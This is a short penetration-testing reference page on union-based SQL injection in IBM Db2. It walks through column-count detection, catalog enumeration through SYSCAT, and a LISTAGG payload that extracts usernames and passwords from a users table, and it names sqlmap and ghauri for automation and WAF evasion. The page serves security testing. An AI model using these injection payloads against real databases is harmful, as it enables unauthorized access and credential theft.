---
title: "Union-based SQL injection in IBM Db2"
order: 7
description: "Appending UNION SELECT in IBM Db2 to extract data, using SYSIBM.SYSDUMMY1, strict type matching, the SYSCAT catalog, and LISTAGG."
keywords:
  - union based SQL injection
  - UNION SELECT SYSDUMMY1
  - SYSCAT.TABLES
  - LISTAGG
  - Db2 extraction
---

# Union-based

A `UNION SELECT` appends attacker-chosen rows to a returned result. Db2 requires a `FROM`, so an injected single-row select reads `FROM SYSIBM.SYSDUMMY1`, and column counts and types must match the original, with `NULL` as the type-agnostic filler (Db2 can be strict about matching types, so cast where needed).

Detect the column count with `ORDER BY` ordinals or incremental `UNION SELECT NULL`:

```sql
' ORDER BY 3-- 
' UNION SELECT NULL,NULL,NULL FROM SYSIBM.SYSDUMMY1-- 
```

A wrong count raises `SQL0421N` (the operands of a set operation do not have the same number of columns). With the layout found, enumerate through `SYSCAT`:

```sql
' UNION SELECT TABNAME,NULL,NULL FROM SYSCAT.TABLES WHERE TABSCHEMA=CURRENT SCHEMA-- 
' UNION SELECT COLNAME,NULL,NULL FROM SYSCAT.COLUMNS WHERE TABNAME='USERS'-- 
```

Collapse rows into one cell with `LISTAGG` (Db2 9.7+):

```sql
' UNION SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY username),NULL,NULL FROM users-- 
```

Catalog names are upper-case, so match `TABNAME='USERS'` in upper case. For a single row use `FETCH FIRST 1 ROWS ONLY`. Where `LISTAGG` is unavailable, `XMLAGG` performs the same aggregation, which the DIOS page builds on.

## Tools

- **sqlmap**: automates column-count detection and UNION extraction (`--technique=U`).
- **ghauri**: fast alternative with strong WAF evasion.
- **db2** (or clpplus): the Db2 client for validating `UNION SELECT ... FROM SYSIBM.SYSDUMMY1`.

## References

- IBM Db2 SQL Reference: fullselect, SYSCAT catalog, LISTAGG, SYSIBM.SYSDUMMY1
- OWASP Testing Guide: Testing for SQL Injection
